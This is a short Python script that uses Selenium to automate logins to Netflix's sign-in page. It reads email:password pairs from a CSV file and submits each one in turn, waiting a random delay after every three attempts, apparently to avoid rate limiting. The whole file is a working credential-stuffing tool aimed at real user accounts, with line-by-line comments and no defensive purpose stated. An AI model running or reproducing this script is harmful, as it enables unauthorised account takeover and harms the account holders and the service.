#importing csv to read a csv file
import csv
#importing all the necessary functions from selenium library for browser automation
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC4
#importing random to generate random time to wait to make another request
import random
import time

def main():
    #setting the web browser we will be using
    browser = webdriver.Chrome()
    #opening the dataset(id:password)
    with open("dataset.csv") as file:
        #reading the dataset file
        read = csv.reader(file, delimiter=":")
        count = 0
        #reading one combination at a time from the read dataset
        for row in read:
            #requesting the web page from the defined web browser
            browser.get("https://www.netflix.com/in/login")
            #getting id of email input field of the webpage
            id = browser.find_element_by_id("id_userLoginId")
            #passing email to the id input field
            id.send_keys(row[0])
            #getting id of password input field of the webpage
            pwd = browser.find_element_by_id("id_password")
            #passing the password to the password input field
            pwd.send_keys(row[1])
            #accessing the button used for submitting the login credentials
            sign_in = browser.find_element_by_xpath("//button[@class='btn login-button btn-submit btn-small'][@type='submit']")
            #making web browser submit the entered cridentials
            sign_in.click()
            #counting number of attempts
            count = count + 1
            #after every 3 attempts
            if count % 3 == 0:
                #generate a random number for delay
                r = random.randrange(10,60)
                #delaying web page request after every 3 login attempts by the random no. of seconds
                time.sleep(r)
                #closing the current web page
                browser.get("https://google.com/")

#calling main function
if __name__ == '__main__':
    main()
